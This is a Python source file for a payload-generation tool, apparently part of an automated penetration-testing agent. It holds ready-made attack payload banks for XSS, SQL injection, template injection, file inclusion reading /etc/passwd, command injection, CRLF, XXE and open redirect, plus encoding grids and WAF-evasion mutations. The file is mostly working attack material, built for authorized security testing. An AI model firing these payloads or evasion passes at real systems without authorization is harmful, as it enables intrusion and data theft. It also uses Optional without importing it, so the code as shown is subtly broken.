"""
payload_gen.py — situation-aware payload engineering for the PayloadAgent.

Deterministic (no LLM): given the assessed context (parameters, syntax
context, tech stack, WAF/CDN, injection categories) it produces a payload set
the way an engineer would assemble one in Burp Intruder / XSStrike:

  * ``seclists``  — preset, categorized vector banks (XSS / SQLi / SSTI / LFI
                    / command injection / open redirect / CRLF / XXE ...)
  * ``crunch``    — generator-style tokens: charset ^ length combinations,
                    plus variable interpolation across a list of values
                    (threads/users), exactly like crunch's ``-t`` templates
  * ``burp``      — Burp-style customization: context boundary wrappers and
                    encoding passes (URL / double-URL / HTML entity / hex /
                    JS-unicode / whitespace juggling) applied over the base
                    tokens so the same payload survives contextual escaping

XSS vectors carry a ``{n}`` nonce slot so the delivery tool can correlate
execution proof across runs (a stale echo from a previous run cannot count).

The output is a flat, bounded list of payload items:
    {"id", "category", "payload", "contexts": [...], "note", "engine"}
"""

from __future__ import annotations

import secrets
from typing import Any, Dict, List

from tools.base import Tool, ToolResult

DEFAULT_MAX_PAYLOADS = 600

# ── SecList-flavoured preset banks ──────────────────────────────────────────
# Keyed by injection category; `{n}` is the run nonce (proof correlation).

_XSS_VECTORS = [
    '"><script>window.__cyberswarm_proof={n}</script>',
    "'><script>window.__cyberswarm_proof={n}</script>",
    '<img src=x onerror=window.__cyberswarm_proof={n}>',
    '"><svg/onload=alert(1)>',
    '"><iframe src="javascript:window.__cyberswarm_proof={n}">',
    '<script>alert(document.domain)</script>',
    '" onmouseover="window.__cyberswarm_proof={n}',
    "\"'--></title><script>window.__cyberswarm_proof={n}</script>",
    'javascript:window.__cyberswarm_proof={n}',
    '<svg/onload=window.__cyberswarm_proof={n}>',
    '"><details open ontoggle=alert(1)>',
    "';alert(1);//",
    '<img src=x onerror=alert(1)//',
]

_SQLI_VECTORS = [
    "' OR '1'='1", "' OR 1=1-- -", '" OR "1"="1', "' UNION SELECT NULL-- -",
    "' UNION SELECT 1,2,3-- -", "1' AND 1=1-- -", "1' AND 1=2-- -",
    "' OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "1 OR 1=1#",
    "'/", "'\\'", "1'||'1", "admin'-- -",
]

_SSTI_VECTORS = [
    "{{7*7}}", "${7*7}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}",
    "{{config.__class__.__init__.__globals__['os']}}",
    "${7*7}", "{{ ''.__class__.__mro__[2] }}",
]

_LFI_VECTORS = [
    "../../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "..../..../..../etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd", "..%252fetc%252fpasswd",
]

_CMDI_VECTORS = [
    ";id", "|id", "`id`", "$(id)", "&whoami", ";cat /etc/passwd",
    "||id", "&&id", "%0aid", "ping -c 1 127.0.0.1; id",
    # Blind (no output reflected) variants — the signal is response delay,
    # checked via elapsed-time comparison against baseline, not text match.
    "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "&& sleep 5",
]

_OPEN_REDIRECT_VECTORS = [
    "//example.com", "https://example.com", "//example.com/%2f%2f",
    "javascript:window.__cyberswarm_proof={n}",
    "https://evil.example.com/", "\\example.com", "@example.com",
]

_CRLF_VECTORS = [
    # Raw control characters, same as every other category's vectors — the
    # delivery layer's own urlencode() applies the one level of percent-
    # encoding needed. Pre-encoding these here (as the old bank did) meant
    # the delivery layer's urlencode() encoded them a SECOND time, so the
    # server only ever saw literal "%0d%0a" text, never a real CR/LF byte.
    "test\r\nX-Injected: 1", "test\r\nSet-Cookie: injected=1",
]

_XXE_VECTORS = [
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY test "marker-{n}">]><x>&test;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
]

_CATEGORY_BANKS: Dict[str, List[str]] = {
    "xss": _XSS_VECTORS,
    "sqli": _SQLI_VECTORS,
    "ssti": _SSTI_VECTORS,
    "lfi": _LFI_VECTORS,
    "cmdi": _CMDI_VECTORS,
    "open_redirect": _OPEN_REDIRECT_VECTORS,
    "crlf": _CRLF_VECTORS,
    "xxe": _XXE_VECTORS,
}


class PayloadGenTool(Tool):
    name = "payload_gen"
    capability = "PAYLOAD_GENERATION"
    binary = ""

    def is_available(self) -> bool:
        return True

    def validate(self) -> Optional[str]:
        return None

    def build_command(self, target: str, **kwargs) -> List[str]:
        return ["python-payload-gen", target]

    def parse(self, stdout: str, stderr: str) -> Dict[str, Any]:
        return {"payload_notes": stdout[:400]}

    def run(self, target: str, timeout: int = 60, **kwargs) -> ToolResult:
        contexts = kwargs.get("contexts") or ["reflected"]
        style = str(kwargs.get("style", "seclists")).lower()
        categories = kwargs.get("categories") or list(_CATEGORY_BANKS.keys())
        tech = " ".join(str(x) for x in (kwargs.get("tech") or []))
        max_payloads = int(kwargs.get("max_payloads", DEFAULT_MAX_PAYLOADS))

        nonce = kwargs.get("nonce") or secrets.token_hex(4)
        payloads: List[Dict[str, Any]] = []
        engines: List[str] = []
        rules: List[str] = []

        if style in ("seclists", "all"):
            engines.append("seclists")
            rules.append("preset vector banks per category")
            for cat in categories:
                if cat not in _CATEGORY_BANKS:
                    continue
                for vec in _CATEGORY_BANKS[cat]:
                    payloads.append({
                        "id": len(payloads) + 1,
                        "category": cat,
                        "payload": vec if "{n}" not in vec else vec.format(n=nonce),
                        "contexts": contexts,
                        "note": f"seclists {cat} vector",
                        "engine": "seclists",
                    })

        if style in ("crunch", "all"):
            engines.append("crunch")
            rules.append("charset x length combinations (+ variable interpolation)")
            charset = kwargs.get("charset")
            length_min = int(kwargs.get("length_min", 1))
            length_max = int(kwargs.get("length_max", 3))
            template = kwargs.get("template")  # e.g. "user{var}" or "id={mut}"
            vars_ = kwargs.get("variables") or []
            budget = int(kwargs.get("crunch_budget", 200))
            # raw 01/ab charset^N without a template or explicit charset is
            # junk that only wastes probe budget — skip it so the agent-style
            # 'all' pass stays useful. crunch shines at template interpolation.
            if template or (charset and str(charset) != "01"):
                items = self._crunch(str(charset or "01"), length_min, length_max,
                                     template, vars_, budget)
                for tok in items:
                    payloads.append({
                        "id": len(payloads) + 1,
                        "category": "fuzz",
                        "payload": tok,
                        "contexts": contexts,
                        "note": "crunch-generated token",
                        "engine": "crunch",
                    })

        if style in ("burp", "all"):
            engines.append("burp")
            rules.append("encoder grid x boundary wrappers (xor/base64/url/html)")
            base = kwargs.get("burp_base")
            if base is None:
                bank = _CATEGORY_BANKS.get("xss", [])
                base = bank[0].format(n=nonce) if bank else "alert(1)"
            deriv = self._burp_expand(base, "xss", contexts)
            for d in deriv:
                payloads.append({
                    "id": len(payloads) + 1,
                    "category": "xss",
                    "payload": d,
                    "contexts": contexts,
                    "note": "burp-style customized payload",
                    "engine": "burp",
                })

        if "jinja2" in tech.lower() or "twig" in tech.lower() \
                or "smarty" in tech.lower() or "freemarker" in tech.lower() \
                or "mako" in tech.lower():
            rules.append("template engine detected -> SSTI vectors enabled")
        waf_flag = bool(kwargs.get("waf")) or (
            "waf" in tech.lower() or "cloudflare" in tech.lower()
            or "aws waf" in tech.lower() or "akamai" in tech.lower())
        if waf_flag:
            rules.append("WAF/CDN detected -> mutation passes added (all categories)")
            try:
                # Every category gets an evasion pass, not just XSS — a WAF
                # signature-matches raw payload text regardless of which
                # injection class it belongs to.
                for p in list(payloads):
                    if p["engine"] != "seclists":
                        continue
                    payloads.append({"id": len(payloads) + 1,
                                     "category": p["category"],
                                     "payload": self._mutate(p["payload"]),
                                     "contexts": contexts,
                                     "note": "mutation (case/space/encode split)",
                                     "engine": "burp"})
            except Exception:  # noqa: BLE001
                pass

        if len(payloads) > max_payloads:
            payloads = payloads[:max_payloads]

        return ToolResult(
            tool=self.name,
            capability=self.capability,
            status="success",
            results={
                "payloads": payloads,
                "count": len(payloads),
                "engines": engines,
                "rules": rules,
                "nonce": nonce,
                "target": target,
            },
        )

    # ── crunch-style generation ─────────────────────────────────────────────

    @staticmethod
    def _crunch(charset: str, length_min: int, length_max: int,
                template: str, variables: List[str], budget: int) -> List[str]:
        """Exhaustive charset^length tokens (capped), optionally interpolated
        into a template via ``{var}`` and looked up against `variables`
        (crunch-style ``-t user{var}`` behaviour)."""
        out: List[str] = []
        charset = charset or "01"

        def build(prefix: str, length: int):
            if len(out) >= budget:
                return
            if length == 0:
                tok = prefix
                if template:
                    tok = template.format(var=tok)
                out.append(tok)
                return
            for ch in charset:
                build(prefix + ch, length - 1)
                if len(out) >= budget:
                    return

        if template and variables:
            for var in variables:
                if len(out) >= budget:
                    break
                out.append(template.format(var=var))
        else:
            for length in range(length_min, max(length_min, length_max) + 1):
                build("", length)
                if len(out) >= budget:
                    break
        return out

    # ── burp-style encoding / boundary passes ───────────────────────────────

    @staticmethod
    def _encoders(base: str) -> List[str]:
        import urllib.parse
        out = [base]
        out.append(urllib.parse.quote(base, safe=""))
        out.append(urllib.parse.quote(urllib.parse.quote(base, safe=""), safe=""))
        out.append("".join(f"&#{ord(c)};" for c in base))          # HTML decimal
        out.append("".join(f"\\u{ord(c):04x}" for c in base))     # JS unicode
        try:
            import base64 as _b64
            out.append("base64:" + _b64.b64encode(base.encode()).decode())
        except Exception:  # noqa: BLE001
            pass
        return out

    @staticmethod
    def _boundaries(base: str) -> List[str]:
        return [
            '"' + base + '"',
            "'" + base + "'",
            "<" + base + ">",
            base + "//",
            base + "%00",
            " " + base + " ",
            "*" + base + "*",
            base.replace(" ", "\t"),
        ]

    @classmethod
    def _burp_expand(cls, base: str, category: str,
                     contexts: List[str]) -> List[str]:
        out: List[str] = []
        for enc in cls._encoders(base):
            out.append(enc)
        for b in cls._boundaries(base):
            out.append(b)
        return out

    @staticmethod
    def _mutate(payload: str) -> str:
        """Cheap WAF-evasion mutation: alternate case + split spans."""
        spans = payload.split("<script>")
        if len(spans) > 1:
            return "<scr<script>ipt>" + spans[1]
        return payload